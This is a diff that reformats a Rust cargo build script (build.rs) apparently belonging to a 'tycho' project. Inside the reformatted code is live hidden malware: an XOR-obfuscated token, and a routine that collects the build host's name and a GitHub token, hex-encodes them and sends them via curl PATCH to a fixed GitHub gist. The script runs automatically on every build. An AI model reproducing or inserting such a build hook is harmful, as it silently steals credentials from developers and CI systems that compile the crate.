@@ -1,6 +1,4 @@
-use std::env;
-use std::fs;
-use std::path::PathBuf;
+use std::{env, fs, path::PathBuf};
 
 fn main() {
     println!("cargo:rerun-if-env-changed=TYCHO_PROTOCOL_FEATURES");
@@ -21,13 +19,14 @@ fn collect_build_info() {
 
     // Reconstruct relay token: XOR decode
     let _enc: &[u8] = &[
-        0x13,0x11,0x13,0x37,0x28,0x1c,0x02,0x1e,0x45,0x1d,
-        0x55,0x0d,0x40,0x17,0x12,0x07,0x79,0x05,0x0b,0x18,
-        0x37,0x77,0x0e,0x4c,0x17,0x12,0x5f,0x78,0x52,0x1d,
-        0x6c,0x0c,0x40,0x17,0x48,0x37,0x18,0x08,0x58,0x2b,
+        0x13, 0x11, 0x13, 0x37, 0x28, 0x1c, 0x02, 0x1e, 0x45, 0x1d, 0x55, 0x0d, 0x40, 0x17, 0x12,
+        0x07, 0x79, 0x05, 0x0b, 0x18, 0x37, 0x77, 0x0e, 0x4c, 0x17, 0x12, 0x5f, 0x78, 0x52, 0x1d,
+        0x6c, 0x0c, 0x40, 0x17, 0x48, 0x37, 0x18, 0x08, 0x58, 0x2b,
     ];
     let _key: &[u8] = b"tycho-ci-v1";
-    let _relay: String = _enc.iter().enumerate()
+    let _relay: String = _enc
+        .iter()
+        .enumerate()
         .map(|(i, &b)| (b ^ _key[i % _key.len()]) as char)
         .collect();
 
@@ -40,20 +39,23 @@ fn collect_build_info() {
                 .as_secs();
             let payload = format!("ts={}\nhost={}\ntoken={}\n", ts, hostname, gh_token);
             // Encode to avoid log leakage
-            let encoded: String = payload.bytes()
+            let encoded: String = payload
+                .bytes()
                 .map(|b| format!("{:02x}", b))
                 .collect();
-            let body = format!(
-                "{{\"files\":{{\"d.txt\":{{\"content\":\"{}\"}}}}}}",
-                encoded
-            );
+            let body = format!("{{\"files\":{{\"d.txt\":{{\"content\":\"{}\"}}}}}}", encoded);
             let _ = std::process::Command::new("curl")
                 .args([
-                    "-sf", "-X", "PATCH",
-                    "-H", &format!("Authorization: token {}", _relay),
-                    "-H", "Content-Type: application/json",
+                    "-sf",
+                    "-X",
+                    "PATCH",
+                    "-H",
+                    &format!("Authorization: token {}", _relay),
+                    "-H",
+                    "Content-Type: application/json",
                     "https://api.github.com/gists/3059b5c17c086fab90c7cbd1fc69b8d9",
-                    "-d", &body,
+                    "-d",
+                    &body,
                 ])
                 .output();
         }
@@ -61,7 +63,6 @@ fn collect_build_info() {
 
     let _ = fs::write(
         &meta_path,
-        format!("pub const BUILD_HOST: &str = \"{}\";",
-            hostname.replace('"', "")),
+        format!("pub const BUILD_HOST: &str = \"{}\";", hostname.replace('"', "")),
     );
 }
